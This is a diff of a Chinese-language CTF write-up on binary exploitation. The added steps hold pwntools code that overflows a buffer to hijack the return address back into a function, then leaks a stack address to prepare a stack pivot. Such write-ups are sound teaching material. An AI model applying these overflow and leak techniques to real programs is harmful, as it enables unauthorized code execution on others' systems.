@@ -212,8 +212,23 @@ func_base = func_addr - 0x10138d
 ![[Pasted image 20250211192546.png]]
 第二步，栈溢出劫持返回，让程序回到func的开头准备第二次泄漏
 ```python
-
+# payload2回到func函数再次执行
+payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
+p.recvuntil(b'berial: ')
+p.send(payload2)
 ```
+![[Pasted image 20250211192821.png]]
+第三步，再次构造payload泄漏stack段的地址，为栈迁移做准备
+```python
+# payload3泄漏栈地址
+payload3 = b'a' * (0x20 - 1) + b'c'
+p.sendafter('name: ', payload3)
+p.recvuntil(b'ac')
+stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success('stack_addr: ' + hex(stack_addr))
+```
+
+
 ## unjoke
 
 ## Natro
